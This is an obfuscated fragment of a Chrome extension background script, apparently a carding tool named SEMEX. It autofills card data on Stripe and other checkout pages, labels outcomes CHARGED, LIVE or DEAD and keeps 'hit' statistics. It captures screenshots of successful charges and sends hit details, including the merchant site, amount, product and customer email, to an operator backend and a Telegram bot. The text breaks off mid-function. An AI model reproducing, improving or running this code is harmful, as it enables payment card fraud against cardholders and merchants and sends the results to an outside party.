          if (_stCardFrameClicked) break;
          await new Promise(_r => setTimeout(_r, 400));
        }
      })();
    }
    if (_0x2ece2b) _0x2ece2b({ success: true });
    return true;
  }
  if (_0x2d827f.type === "VERIFY_SESSION") {
    serverClient.verifySession().then(_0x124975 => {
      _0x2ece2b(_0x124975);
    }).catch(_0x1aa0bc => {
      _0x2ece2b({
        valid: false,
        reason: "verification_error",
        message: _0x1aa0bc.message
      });
    });
    return true;
  }
  if (_0x2d827f.type === "SEMEX_TELEGRAM_LOGIN") {
    // Telegram deep-link login (v4.1.0). The popup CLOSES the instant the
    // Telegram tab opens, so the whole flow must live here in the worker:
    // mint token → open t.me deep link → poll status → store tokens.
    (async () => {
      try {
        await serverClient.init();
        let _0xpend = null;
        try { _0xpend = (await chrome.storage.session.get("__xtglogin")).__xtglogin || null; } catch (_0xe0) {}
        let _0xstart = null;
        if (_0xpend && _0xpend.expiresAt > Date.now() + 15000 && _0xpend.deepLink) {
          _0xstart = { success: true, token: _0xpend.token, deepLink: _0xpend.deepLink, expiresIn: Math.floor((_0xpend.expiresAt - Date.now()) / 1000) };
        } else {
          _0xstart = await serverClient.telegramLoginStart();
        }
        if (!_0xstart || !_0xstart.success || !_0xstart.deepLink) {
          _0x2ece2b({ success: false, error: (_0xstart && (_0xstart.error || _0xstart.message)) || "Could not start Telegram login" });
          return;
        }
        await chrome.storage.session.set({ __xtglogin: { token: _0xstart.token, deepLink: _0xstart.deepLink, expiresAt: Date.now() + (_0xstart.expiresIn || 300) * 1000 } });
        await chrome.tabs.create({ url: _0xstart.deepLink });
        _0x2ece2b({ success: true, deepLink: _0xstart.deepLink });
        const _0xdeadline = Date.now() + (_0xstart.expiresIn || 300) * 1000 + 5000;
        while (Date.now() < _0xdeadline) {
          await new Promise(_0xr => setTimeout(_0xr, 2000));
          // Cancel check + MV3 keepalive in one extension-API call: if the
          // pending entry is gone (user cancelled / new login), stop polling.
          let _0xstill = null;
          try { _0xstill = (await chrome.storage.session.get("__xtglogin")).__xtglogin; } catch (_0xe1) {}
          if (!_0xstill || _0xstill.token !== _0xstart.token) return;
          let _0xst = null;
          try { _0xst = await serverClient.telegramLoginStatus(_0xstart.token); } catch (_0xe2) { continue; }
          if (!_0xst) continue;
          if (_0xst.status === "authorized") {
            await chrome.storage.session.remove(["__xtglogin", "__xcabuf"]);
            // Save session tokens so the popup can complete login.
            // The FIRST poll on an authorized token returns the full auth_payload
            // (accessToken, refreshToken, sessionId). Subsequent polls return
            // {status:"authorized", delivered:true} with no tokens — guard on
            // accessToken presence so the second path is a harmless no-op.
            if (_0xst.accessToken) {
              try {
                await chrome.storage.local.set({
                  [_SK_AT]: _0xst.accessToken,
                  [_SK_RT]: _0xst.refreshToken || null,
                  [_SK_SID]: _0xst.sessionId || null,
                });
              } catch (_0xe3s) {}
            }
            try {
              if (chrome.notifications && chrome.notifications.create) {
                chrome.notifications.create("", {
                  type: "basic",
                  iconUrl: "icons/logo.png",
                  title: "SEMEX",
                  message: "Login successful — click the SEMEX icon to continue."
                }, () => void chrome.runtime.lastError);
              }
            } catch (_0xe3) {}
            return;
          }
          if (_0xst.status === "denied" || _0xst.status === "expired") {
            await chrome.storage.session.remove(["__xtglogin"]);
            return;
          }
        }
        await chrome.storage.session.remove(["__xtglogin"]);
      } catch (_0xerr) {
        try { _0x2ece2b({ success: false, error: (_0xerr && _0xerr.message) || "Telegram login failed" }); } catch (_0xe4) {}
      }
    })();
    return true;
  }
  if (_0x2d827f.type === "GET_CACHED_FORM_DATA") {
    // Domain-scoped lookup: the prefetch buffer (fetchSingleFormData) holds
    // STRIPE-generic selector configs. A Whop/Basis Theory (or any non-Stripe)
    // fill that consumed one got selectors that don't exist in its DOM — the
    // fill silently missed every non-lucky field (live-verified on Whop:
    // name/line1/zip/expiry all empty). Tag entries with their domain and only
    // serve a matching one; a mismatch returns success:false so the content
    // script's CHECK_CONFIG force-refetch path (which writes a domain-correct
    // entry) takes over.
    const _reqDomain = (_0x2d827f.domain || "").toLowerCase();
    const _domainMatches = (_entryDomain) => {
      const _ed = (_entryDomain || "").toLowerCase();
      if (!_reqDomain || !_ed) return false;
      if (_ed === _reqDomain) return true;
      // All Stripe-hosted surfaces share one selector profile.
      return _ed.includes("stripe") && _reqDomain.includes("stripe");
    };
    chrome.storage.session.get("__xcabuf").then(_0x568ae3 => {
      // BUGFIX: value lives under the "__xcabuf" key, not ".cachedAddressBuffer" —
      // the old read always saw an empty buffer so every autofill re-fetched.
      let _0xb3d9ea = (_0x568ae3 && _0x568ae3.__xcabuf) || [];
      let _matchIdx = -1;
      if (_reqDomain) {
        for (let _mi = 0; _mi < _0xb3d9ea.length; _mi++) {
          if (_domainMatches(_0xb3d9ea[_mi] && _0xb3d9ea[_mi].domain)) { _matchIdx = _mi; break; }
        }
      } else if (_0xb3d9ea.length > 0) {
        _matchIdx = 0; // legacy callers without a domain: keep old FIFO behavior
      }
      if (_matchIdx >= 0) {
        const _0x372bed = _0xb3d9ea.splice(_matchIdx, 1)[0];
        chrome.storage.session.set({
          __xcabuf: _0xb3d9ea
        }).catch(() => {}).finally(() => {
          if (_0xb3d9ea.length < REFILL_THRESHOLD) {
            manageAddressBuffer().catch(() => {});
          }
        });
        _0x2ece2b({
          success: true,
          data: _0x372bed
        });
      } else if (_reqDomain) {
        // No config for THIS domain in the buffer — fail so the caller forces
        // a CHECK_CONFIG refetch keyed to the right domain.
        _0x2ece2b({
          success: false,
          reason: "domain_mismatch"
        });
      } else {
        fetchSingleFormData().then(_0x1b437f => {
          _0x2ece2b({
            success: !!_0x1b437f,
            data: _0x1b437f
          });
          manageAddressBuffer();
        });
      }
    }).catch(_0x348fe1 => {
      _0x2ece2b({
        success: false,
        reason: "error",
        message: _0x348fe1.message
      });
    });
    return true;
  }
  if (_0x2d827f.type === "RELAY_CARD_DATA") {
    if (_0x393846.tab && _0x393846.tab.id) {
      // Record when a card was actually filled into a page — used to gate
      // PAYMENT_RESULT so that stray "status:succeeded" JSON on unrelated pages
      // (file downloads, WP admin ajax, etc.) can't fake a CHARGED hit.
      try {
        _semexLastFillByTab.set(_0x393846.tab.id, Date.now());
      } catch (_e) {}
      chrome.tabs.sendMessage(_0x393846.tab.id, {
        type: "CARD_DATA_CAPTURED",
        card: _0x2d827f.card
      });
    }
    return;
  }
  if (_0x2d827f.type === "SEMEX_CARD_ACTIVITY") {
    // Manual typing detected in a card field on this tab — mark it as a genuine
    // fill so the false-charged guard lets real manual checkouts through
    // (previously only overlay autofill via RELAY_CARD_DATA marked the tab, so
    // manual entries were silently dropped as "no recent fill").
    if (_0x393846 && _0x393846.tab && _0x393846.tab.id) {
      try {
        _semexLastFillByTab.set(_0x393846.tab.id, Date.now());
      } catch (_e) {}
    }
    return;
  }
  if (_0x2d827f.type === "PAYMENT_RESULT") {
    // FALSE-CHARGED GUARD (single source of truth): decide up-front whether this
    // payload is trustworthy. If not, drop entirely — don't inflate stats and don't
    // forward. A "trustworthy" forwardable hit either carries a valid card object
    // OR follows a recent card fill on the same tab (overlay-driven flow).
    {
      const _s = _0x2d827f.status;
      const _fwd = _s === "CHARGED" || _s === "CCN_LIVE" || _s === "LIVE";
      const _c = _0x2d827f.card;
      const _hasCard = !!(_c && typeof _c === "object" && (_c.number || _c.cc));
      const _tid = _0x393846 && _0x393846.tab && _0x393846.tab.id;
      const _lf = _tid ? _semexLastFillByTab.get(_tid) : 0;
      const _fresh = _lf && (Date.now() - _lf) < _SEMEX_FILL_WINDOW_MS;
      // HARD RULE: forwardable hits MUST carry a valid card. Anything else is
      // a false positive from a random gateway-like response on an unrelated
      // page — e.g. hyper3d.com's Stripe "success" widget firing without any
      // actual card fill on this tab. The old "OR" logic (card OR fill) let
      // through a fake CHARGED with empty card whenever a fill happened
      // earlier in the tab's life. New rule: card MUST be present. Fill
      // freshness is required additionally for extra safety.
      if (_fwd && !_hasCard) {
        console.warn("[SEMEX/bg] dropping false hit (empty card on forwardable)", { status: _s, card: _c });
        try { notifyBackendResult(_tid, false, "Hit dropped: no card data", _s); } catch (_e2) {}
        try { _0x2ece2b({ received: true, dropped: "empty_card" }); } catch (e) {}
        return true;
      }
      if (_fwd && !_fresh) {
        console.warn("[SEMEX/bg] dropping false hit (no recent fill for forwardable)", { status: _s });
        try { notifyBackendResult(_tid, false, "Hit dropped: no recent card fill on this tab", _s); } catch (_e3) {}
        try { _0x2ece2b({ received: true, dropped: "no_recent_fill" }); } catch (e) {}
        return true;
      }
    }
    // CLIENT-SIDE HIT DEDUP — must run BEFORE stats and BEFORE the keepalive so
    // duplicate PAYMENT_RESULT messages (invoice double-detect, 3DS retries) never
    // inflate the local statistics counter or start an unnecessary keepalive.
    // Key uses the FULL card number (not last-4) to avoid false collisions between
    // different cards that share a suffix. The key is NOT committed to the cache
    // here — only committed after submitStatus succeeds, so a network failure or
    // server-side rejection allows the operator to retry the same hit.
    const _semexHitCardFull = (_0x2d827f.card && (_0x2d827f.card.number || _0x2d827f.card.cardNumber)) ? String(_0x2d827f.card.number || _0x2d827f.card.cardNumber).replace(/\D/g, "") : "";
    const _semexHitHostKey = (_0x2d827f.details && (_0x2d827f.details.hostname || _0x2d827f.details.siteUrl)) || "";
    const _semexHitKey = ((_0x393846 && _0x393846.tab && _0x393846.tab.id) || 0) + "|" + (_0x2d827f.status || "") + "|" + _semexHitCardFull + "|" + _semexHitHostKey;
    const _semexHitCache = (self.__semexHitCache = self.__semexHitCache || new Map());
    {
      const _semexHitPrev = _semexHitCache.get(_semexHitKey);
      if (_semexHitPrev && (Date.now() - _semexHitPrev) < 12000) {
        // Duplicate within the dedup window — drop without logging card data.
        console.warn("[SEMEX/bg] dropping duplicate hit within dedup window (status=" + (_0x2d827f.status || "") + ")");
        try { _0x2ece2b({ received: true, dropped: "duplicate_hit" }); } catch (_eDb) {}
        return true;
      }
      // Reserve the slot immediately (in-flight marker) so concurrent duplicate
      // PAYMENT_RESULT messages that arrive before the async submit completes also
      // hit the guard above. The slot is cleared on submit failure so retries can
      // proceed, and replaced with a committed timestamp on success.
      _semexHitCache.set(_semexHitKey, Date.now());
      if (_semexHitCache.size > 100) { const _hk0 = _semexHitCache.keys().next().value; _semexHitCache.delete(_hk0); }
    }
    // MV3 SERVICE WORKER KEEPALIVE — the checkout page navigates to the success
    // URL immediately after firing PAYMENT_RESULT, which unloads the content
    // script and closes the message port. Chrome then terminates the service
    // worker before the async screenshot + submit completes. Fix: ping Chrome
    // every 20 s so the worker stays alive for the full operation, then clear.
    const _0xKeepaliveTimer = setInterval(() => {
      try { chrome.runtime.getPlatformInfo(() => {}); } catch (_ek) {}
    }, 20000);
    // BUGFIX: hard-stop the keepalive after 5 min even if the handler below
    // throws before reaching its own clearInterval (was a permanent leak).
    setTimeout(() => { try { clearInterval(_0xKeepaliveTimer); } catch (_ek2) {} }, 300000);
    _semexStatsQueue = _semexStatsQueue.then(async () => {
      try {
        const _0x5edf83 = await chrome.storage.local.get(["statistics"]);
        const _0x52e6cd = _0x5edf83.statistics || {
          totalCards: 0,
          charged: 0,
          ccnLive: 0,
          dead: 0,
          lastUpdated: Date.now()
        };
        // "Hits" (totalCards) = CHARGED count only. Declines / live don't count as hits.
        if (_0x2d827f.status === "CHARGED") {
          _0x52e6cd.totalCards++;
          _0x52e6cd.charged++;
        } else if (_0x2d827f.status === "CCN_LIVE") {
          _0x52e6cd.ccnLive++;
        } else if (_0x2d827f.status === "DEAD") {
          _0x52e6cd.dead++;
        }
        _0x52e6cd.lastUpdated = Date.now();
        await chrome.storage.local.set({
          statistics: _0x52e6cd
        });
      } catch (_0x47df76) {}
    }).catch(() => {});
    (async () => {
      var _0x234d07;
      var _0x53c06c;
      var _0x2fc074;
      var _0x2f65a1;
      const _submitId = (typeof crypto !== "undefined" && crypto.randomUUID) ? crypto.randomUUID() : Date.now() + "-" + Math.random().toString(36).slice(2);
      // v2.9.1: capture the screenshot IN PARALLEL with the hit submit instead of
      // blocking on it — the Telegram notification now goes out instantly and the
      // screenshot follows via /api/data/screenshot a moment later. Now covers
      // LIVE-class hits too (previously CHARGED only).
      const _semexShotStatuses = ["CHARGED", "LIVE", "CCN_LIVE", "3D_LIVE"];
      const _shotPromise = (async () => {
      let _0x4f463b = null;
      if (_semexShotStatuses.indexOf(_0x2d827f.status) === -1) {
        return null;
      }
      // Per-hit screenshot dedup: duplicate PAYMENT_RESULT messages (retries,
      // double-detect on invoice/billing pages) used to each run the full
      // capture flow → two screenshots per hit. Same tab+status within 8s
      // reuses the in-flight/last capture.
      // v4.0: key now includes card last4 + hostname so the SAME hit detected
      // twice across different tabs (invoice double-detect opens a second tab)
      // also shares one capture — kills the "two screenshots per hit" report.
      const _semexCardKey = (_0x2d827f.card && (_0x2d827f.card.number || _0x2d827f.card.cardNumber)) ? String(_0x2d827f.card.number || _0x2d827f.card.cardNumber).replace(/\D/g, "").slice(-4) : "";
      const _semexHostKey = (_0x2d827f.details && (_0x2d827f.details.hostname || _0x2d827f.details.siteUrl)) || "";
      const _semexShotKey = ((_0x393846 && _0x393846.tab && _0x393846.tab.id) || 0) + "|" + _0x2d827f.status + "|" + _semexCardKey + "|" + _semexHostKey;
      const _semexShotCache = (self.__semexShotCache = self.__semexShotCache || new Map());
      const _semexShotPrev = _semexShotCache.get(_semexShotKey);
      if (_semexShotPrev && (Date.now() - _semexShotPrev.t) < 8000) {
        // Duplicate within the window — share the in-flight/last capture.
        // Entries hold a PROMISE resolving to raw-base64-or-null so the
        // payload contract matches the normal path (split(",")[1] below).
        try { return await _semexShotPrev.p; } catch (_eDup) { return null; }
      }
      // Register an in-flight entry BEFORE the delay/capture so concurrent
      // duplicate PAYMENT_RESULT handlers (invoice double-detect, retries)
      // attach to this capture instead of each taking their own screenshot.
      let _semexShotResolve;
      const _semexShotInflight = new Promise(_r => { _semexShotResolve = _r; });
      _semexShotCache.set(_semexShotKey, { t: Date.now(), p: _semexShotInflight });
      if (_semexShotCache.size > 50) { const _k0 = _semexShotCache.keys().next().value; _semexShotCache.delete(_k0); }
      {
        try {
          const _0xssDelaySettings = await chrome.storage.local.get(["settings"]);
          // Screenshot toggle gate — respect settings.screenshot.enabled (false = skip)
          if (_0xssDelaySettings.settings?.screenshot?.enabled === false) {
            _semexShotResolve(null);
            return null;
          }
          // v4.0.8: SUCCESS-AWARE timing — the old fixed 400ms fired while the
          // checkout's success animation (green tick + starburst) was still
          // mid-render, so the shot missed it. Poll the page via a content-
          // script probe every 250ms; capture as soon as the success UI is
          // visible (+350ms settle so the tick/stars finish animating), or at
          // the 3s cap if it never appears. Falls back to 800ms when the tab
          // can't be probed (mid-navigation / no content script).
          const _tabIdForShotEarly = _0x393846 && _0x393846.tab && _0x393846.tab.id;
          {
            // v4.0.17: STABLE success-aware timing. Two fixes over the old loop
            // that made the shot land "too fast" or "too late":
            //  (1) a single transient probe error no longer aborts the wait. The
            //      old error-break fired exactly as the checkout success page
            //      navigated or re-rendered, so the loop bailed and shot the
            //      pre-tick spinner. We now keep polling through transient errors
            //      and only give up if a content script was NEVER reachable.
            //  (2) the settle after the success UI appears is scaled to WHAT was
            //      seen: the animated Stripe green tick plus starburst needs
            //      ~600ms to finish drawing crisp; a static success or thank-you
            //      page only needs ~350ms. The old fixed 350ms caught it mid-draw.
            const _semexWaitT0 = Date.now();
            const _semexWaitCap = 3500;   // hard cap so a slow tick (3DS / weak net) is still caught
            const _semexPollMs = 200;     // probe cadence
            let _semexProbed = false, _semexReady = false, _semexTick = false, _semexFails = 0;
            if (_tabIdForShotEarly != null) {
              while (Date.now() - _semexWaitT0 < _semexWaitCap) {
                await new Promise(_0x1dd52c => setTimeout(_0x1dd52c, _semexPollMs));
                try {
                  const _semexProbe = await chrome.tabs.sendMessage(_tabIdForShotEarly, { type: "SEMEX_SUCCESS_UI_PROBE" });
                  _semexProbed = true;
                  _semexFails = 0;
                  if (_semexProbe && _semexProbe.ready) { _semexReady = true; _semexTick = !!_semexProbe.tick; break; }
                } catch (_eProbe) {
                  // Transient — the success page is mid-navigation and its content
                  // script isn't listening yet. Keep polling. Only bail if we could
                  // never reach a content script at all (bounded so the fallback
                  // still fires well inside the notification budget).
                  _semexFails++;
                  if (!_semexProbed && _semexFails >= 6) break;
                }
              }
            }
            if (_semexReady && _semexTick) {
              await new Promise(_0x1dd52c => setTimeout(_0x1dd52c, 600));
            } else if (_semexReady) {
              await new Promise(_0x1dd52c => setTimeout(_0x1dd52c, 350));
            } else if (!_semexProbed) {
              await new Promise(_0x1dd52c => setTimeout(_0x1dd52c, 800));
            }
          }
          // Screenshot with retry — captureVisibleTab intermittently fails on Kiwi /
          // mobile and slow networks when the tab loses focus or is mid-navigation.
          // Reliability hardening: (1) hard timeout on every capture so a hung call
          // can't stall the whole hit, (2) after the first failure force the checkout
          // tab to the foreground (mobile only captures the active tab of the focused
          // window — the #1 cause of blank/failed mobile screenshots), (3) fall back
          // through progressively smaller JPEGs (smaller payload = far more likely to
          // both capture AND upload over weak mobile links), (4) progressive backoff.
          const _tabIdForShot = _0x393846 && _0x393846.tab && _0x393846.tab.id;
          const _windowIdForShot = _0x393846 && _0x393846.tab && _0x393846.tab.windowId;
          const _SEMEX_SHOT_TIMEOUT = 2500;
          async function _semexCaptureOnce(format, quality) {
            const opts = { format };
            if (format === "jpeg" && quality) opts.quality = quality;
            const _cap = chrome.tabs.captureVisibleTab(_windowIdForShot != null ? _windowIdForShot : null, opts);
            return await Promise.race([
              _cap,
              new Promise((_res, _rej) => setTimeout(() => _rej(new Error("capture timeout")), _SEMEX_SHOT_TIMEOUT)),
            ]);
          }
          async function _semexFocusShotTab() {
            try { if (_tabIdForShot != null) await new Promise(_r => chrome.tabs.update(_tabIdForShot, { active: true }, () => { void chrome.runtime.lastError; _r(); })); } catch (_e) {}
            try { if (chrome.windows && _windowIdForShot != null) await new Promise(_r => chrome.windows.update(_windowIdForShot, { focused: true }, () => { void chrome.runtime.lastError; _r(); })); } catch (_e) {}
          }
          let _0xf70d33 = null;
          // v2.9.4: focus the checkout tab BEFORE the first attempt, not only
          // after a failure — on Android/Kiwi captureVisibleTab can only shoot
          // the active tab of the focused window, and waiting for a failure
          // first often loses the pre-redirect page.
          await _semexFocusShotTab();
          // v2.9.2: tight budget — 2 attempts max (png, then jpeg-70 fallback)
          // at 2.5s each, so the screenshot is IN the notification without
          // making the owner wait (worst case ~6s incl. the render delay,
          // typical ~1.3s; previously up to ~26s).
          const _semexAttempts = [
            () => _semexCaptureOnce("png"),
            () => _semexCaptureOnce("jpeg", 70),
          ];
          for (let _i = 0; _i < _semexAttempts.length; _i++) {
            try {
              _0xf70d33 = await _semexAttempts[_i]();
              if (_0xf70d33 && _0xf70d33.length > 100) break;
              _0xf70d33 = null;
            } catch (_eShot) {
              console.warn("[SEMEX/bg] screenshot attempt " + (_i + 1) + " failed:", _eShot && _eShot.message);
            }
            // After the first failure, force the checkout tab to the foreground and retry.
            if (_i === 0) { try { await _semexFocusShotTab(); } catch (_e) {} }
            if (_i < _semexAttempts.length - 1) {
              await new Promise(res => setTimeout(res, 300 + _i * 350));
            }
          }
          if (!_0xf70d33) throw new Error("all screenshot attempts failed");
          // CHARGED: save screenshot to device + send to Telegram.
          // LIVE / CCN_LIVE / 3D_LIVE: Telegram-only (silent, no device save).
          if (_0x2d827f.status === "CHARGED" && chrome.downloads) {
            const _0x5a8add = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);
            const _0x3e62a7 = ((_0x2fc074 = _0x2d827f.details) == null ? undefined : _0x2fc074.hostname) || ((_0x2f65a1 = _0x2d827f.details) == null ? undefined : _0x2f65a1.siteUrl) || "unknown";
            let _0x1c375d = _0x3e62a7;
            if (_0x3e62a7.includes("://")) {
              try { _0x1c375d = new URL(_0x3e62a7).hostname; } catch (_0xd9c86) { _0x1c375d = "unknown"; }
            }
            _0x1c375d = (_0x1c375d || "unknown").replace(/[^a-z0-9]/gi, "_");
            const _semexExt = _0xf70d33.startsWith("data:image/jpeg") ? "jpg" : "png";
            const _0x142da8 = "SEMEX_CHARGED_" + _0x1c375d + "_" + _0x5a8add + "." + _semexExt;
            try {
              await chrome.downloads.download({ url: _0xf70d33, filename: _0x142da8, conflictAction: "uniquify", saveAs: false });
            } catch (_eDl) {
              console.warn("[SEMEX/bg] CHARGED local save failed:", _eDl && _eDl.message);
            }
          }
          _0x4f463b = _0xf70d33.split(",")[1];
        } catch (_0x2d63c0) {
          console.warn("[SEMEX/bg] screenshot capture failed:", _0x2d63c0 && _0x2d63c0.message);
        }
      }
      // Settle the in-flight entry so deduped duplicates get the same result.
      try { _semexShotResolve(_0x4f463b); } catch (_eRes) {}
      return _0x4f463b;
      })();
      // v2.9.2: WAIT for the capture (tight budget above) — the screenshot must
      // ride INSIDE the hit notification (photo + full caption), not arrive as
      // a separate late message. The fallback below covers capture failures.
      let _0x4f463b = await _shotPromise;
      // v4.0.3: primary capture missed (tab mid-navigation / mobile focus
      // quirk)? Do ONE focused settle-and-retry BEFORE the hit submit. This
      // retry used to run only AFTER submit, so the template went out as a
      // text message and the screenshot followed as a separate photo with a
      // different caption — they must ride as ONE photo+template message.
      if (!_0x4f463b && _semexShotStatuses.indexOf(_0x2d827f.status) !== -1) {
        try {
          const _preWin = _0x393846 && _0x393846.tab && _0x393846.tab.windowId;
          const _preTab = _0x393846 && _0x393846.tab && _0x393846.tab.id;
          try { if (_preTab != null) await new Promise(_r => chrome.tabs.update(_preTab, { active: true }, () => { void chrome.runtime.lastError; })); } catch (_eFT) {}
          try { if (chrome.windows && _preWin != null) await new Promise(_r => chrome.windows.update(_preWin, { focused: true }, () => { void chrome.runtime.lastError; })); } catch (_eFW) {}
          // brief settle so a mid-navigation tab stops rejecting captures
          await new Promise(_r => setTimeout(_r, 900));
          const _preDataUrl = await Promise.race([
            chrome.tabs.captureVisibleTab(_preWin != null ? _preWin : null, { format: "png" }),
            new Promise((_res, _rej) => setTimeout(() => _rej(new Error("capture timeout")), 3500))
          ]);
          if (_preDataUrl && _preDataUrl.length > 100) {
            _0x4f463b = _preDataUrl.split(",")[1];
            // CHARGED: save to device. LIVE/others: Telegram-only.
            if (_0x2d827f.status === "CHARGED" && chrome.downloads) {
              const _preHost = (((_0x2d827f.details || {}).siteUrl || (_0x2d827f.details || {}).hostname || "unknown") + "").replace(/^https?:\/\//, "").replace(/[^a-z0-9]/gi, "_");
              const _preTs = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);
              try {
                await chrome.downloads.download({
                  url: "data:image/jpeg;base64," + _0x4f463b,
                  filename: "SEMEX_CHARGED_" + _preHost + "_" + _preTs + ".jpg",
                  conflictAction: "uniquify",
                  saveAs: false
                });
              } catch (_ePreDl) {}
            }
          }
        } catch (_ePre) {
          console.warn("[SEMEX/bg] pre-submit capture retry failed:", _ePre && _ePre.message);
        }
      }
      const _0xdetails = _0x2d827f.details || {};
      const _0xtabId = _0x393846 && _0x393846.tab && _0x393846.tab.id;
      // Sanitize fields that the backend types strictly so the request can never be
      // rejected with a 422 (root cause of "server not saved [object Object]"):
      //  - amount: checkout pages send "₹250.00" / "1,250.00" / "$19" → number|undefined
      //  - card: must be an object; drop if it somehow arrives as a string/other
      let _semexAmt = _0xdetails.amount;
      if (typeof _semexAmt === "string") {
        const _n = parseFloat(_semexAmt.replace(/[^0-9.\-]/g, ""));
        _semexAmt = isNaN(_n) ? undefined : _n;
      } else if (typeof _semexAmt !== "number") {
        _semexAmt = undefined;
      }
      let _semexCard = _0x2d827f.card;
      if (_semexCard && typeof _semexCard !== "object") _semexCard = undefined;
      const _0xstoreLast = async (_ok, _reason, _http, _fwd) => {
        try {
          await chrome.storage.local.set({
            __xlhr: {
              ok: !!_ok,
              reason: _reason || "",
              http: _http || 0,
              forwarded: !!_fwd,
              status: _0x2d827f.status || "",
              time: Date.now()
            }
          });
        } catch (e) {}
      };
      // v2.8.6 FIX: honour the popup's Payment Tracking toggle — when off, do
      // not submit hits to the backend (previously the toggle was hydrated in
      // the UI but never consulted here).
      try {
        const _0xptCfg = await chrome.storage.local.get(["settings"]);
        const _0xpt = _0xptCfg && _0xptCfg.settings && _0xptCfg.settings.paymentTracking;
        if (_0xpt && _0xpt.enabled === false) {
          // Clear the in-flight dedup reservation — payment tracking being disabled
          // is not a successful submit, so the operator must be able to re-enable
          // tracking and retry the same hit without it being silently dropped as a
          // duplicate within the 12-second dedup window.
          try { _semexHitCache.delete(_semexHitKey); } catch (_eHdTd) {}
          try { await _0xstoreLast(false, "Payment tracking disabled in settings", 0, false); } catch (_e) {}
          try { _0x2ece2b({ received: true, dropped: "tracking_disabled" }); } catch (_e) {}
          // v2.9.3: stop the keepalive ping before returning — otherwise every
          // tracking-disabled hit leaves a 20s interval running forever,
          // pinning the MV3 worker awake and draining battery.
          try { clearInterval(_0xKeepaliveTimer); } catch (_eck) {}
          return;
        }
      } catch (_e) {}
      // OWN BOT: if the user configured their own Telegram bot, forward the hit
      // directly to api.telegram.org before (and instead of waiting on) the server.
      // Only fires for forwardable statuses; never sends card numbers.
      try {
        const _semexFwdStatuses = ["CHARGED", "LIVE", "CCN_LIVE", "3D_LIVE"];
        if (_semexFwdStatuses.indexOf(_0x2d827f.status) !== -1) {
          const _semexBotCfg = await chrome.storage.local.get(["sx_custom_bot"]);
          const _semexBot = _semexBotCfg && _semexBotCfg.sx_custom_bot;
          if (_semexBot && _semexBot.source === "own") {
            const _semexBotToken = (_semexBot.token || "").trim();
            const _semexBotUid   = (_semexBot.uid   || "").trim();
            // Validate token and uid before firing — notify the overlay if invalid.
            if (/^\d+:[A-Za-z0-9_-]{20,}$/.test(_semexBotToken) && /^\d+$/.test(_semexBotUid)) {
              // Build a concise hit summary — no full card number, only last4.
              const _semexBotCard = _semexCard && typeof _semexCard === "object"
                ? (_semexCard.number || _semexCard.cardNumber || _semexCard.cc || "")
                : "";
              const _semexBotLast4 = _semexBotCard
                ? String(_semexBotCard).replace(/\D/g, "").slice(-4)
                : "????";
              const _semexBotStatus = _0x2d827f.status || "HIT";
              const _semexBotEmoji = _semexBotStatus === "CHARGED" ? "\u2705"
                : (_semexBotStatus === "LIVE" || _semexBotStatus === "CCN_LIVE") ? "\u26a1"
                : _semexBotStatus === "3D_LIVE" ? "\uD83D\uDD10"
                : "\u2757";
              const _semexBotGate = (_0xdetails.gateway || _0xdetails.gate || "").toUpperCase() || "STRIPE";
              const _semexBotSite = _0xdetails.hostname || _0xdetails.siteUrl || _0xdetails.merchant || "unknown";
              const _semexBotAmt  = _semexAmt != null
                ? (_0xdetails.currency ? _semexAmt + " " + (_0xdetails.currency + "").toUpperCase() : String(_semexAmt))
                : "";
              const _semexBotTabId = _0xtabId;
              const _semexHtmlEsc = (s) => String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
              const _semexBotProduct = _semexHtmlEsc((_0xdetails.productName || "").trim());
              const _semexBotEmail   = _semexHtmlEsc((_0xdetails.customerEmail || "").trim());
              // ⚜️-style template matching the server bot's format_hit output.
              let _semexBotText = "\u269C\uFE0F <b>SEMEX</b> \u2014 " + _semexBotStatus + " " + _semexBotEmoji;
              _semexBotText += "\n\u269C\uFE0FCard \u27A1 <code>\u2022\u2022\u2022\u2022 " + _semexBotLast4 + "</code>";
              if (_semexBotAmt) _semexBotText += "\n\u269C\uFE0FAmount \u27A1 <code>" + _semexBotAmt + "</code>";
              _semexBotText += "\n\u269C\uFE0FGateway \u27A1 " + _semexBotGate;
              _semexBotText += "\n- - - - - - - - - - - - - - - - - - - - - -";
              _semexBotText += "\n\u269C\uFE0FSite \u27A1 " + _semexHtmlEsc(_semexBotSite);
              if (_semexBotProduct) _semexBotText += "\n\u269C\uFE0FProduct \u27A1 " + _semexBotProduct;
              if (_semexBotEmail)   _semexBotText += "\n\u269C\uFE0FEmail \u27A1 <code>" + _semexBotEmail + "</code>";
              _semexBotText += "\n- - - - - - - - - - - - - - - - - - - - - -";
              _semexBotText += "\n\u269C\uFE0FCreator \u27A1 <b>\uD835\uDE19\uD835\uDE1E\uD835\uDE17\uD835\uDE1E\uD835\uDE1B</b>";
              // Fire and forget — don't block the hit submit on own-bot delivery.
              // Uses sendPhoto (screenshot as photo, hit text as caption) when a
              // screenshot is available — same format as the server notification.
              // Falls back to sendMessage when no screenshot was captured.
              (async () => {
                try {
                  const _ownBotBase = "https://api.telegram.org/bot" + _semexBotToken;
                  if (_0x4f463b) {
                    // Photo + caption — identical format to the server bot notification.
                    const _fd = new FormData();
                    _fd.append("chat_id", _semexBotUid);
                    // parse_mode appended conditionally below — only when caption keeps HTML.
                    // Telegram caption limit is 1024 VISIBLE chars (HTML tags don't count).
                    // Slicing the raw HTML string would break tags mid-cut → 400 reject.
                    // Strip tags to measure, then truncate plain text if needed.
                    const _visibleLen = _semexBotText.replace(/<[^>]*>/g, "").replace(/&amp;/g,"&").replace(/&lt;/g,"<").replace(/&gt;/g,">").replace(/&quot;/g,'"').replace(/&#?\w+;/g,"?").length;
                    const _cap = _visibleLen > 1024
                      ? _semexBotText.replace(/<[^>]*>/g, "").replace(/&amp;/g,"&").replace(/&lt;/g,"<").replace(/&gt;/g,">").replace(/&quot;/g,'"').replace(/&#?\w+;/g,"?").slice(0, 1021) + "…"
                      : _semexBotText;
                    _fd.append("caption", _cap);
                    // Only use HTML parse_mode when we kept the original (tags intact).
                    if (_visibleLen <= 1024) _fd.append("parse_mode", "HTML");
                    // Convert base64 JPEG → Blob for the multipart upload.
                    const _bytes = atob(_0x4f463b);
                    const _arr = new Uint8Array(_bytes.length);
                    for (let _bi = 0; _bi < _bytes.length; _bi++) _arr[_bi] = _bytes.charCodeAt(_bi);
                    _fd.append("photo", new Blob([_arr], { type: "image/jpeg" }), "hit.jpg");
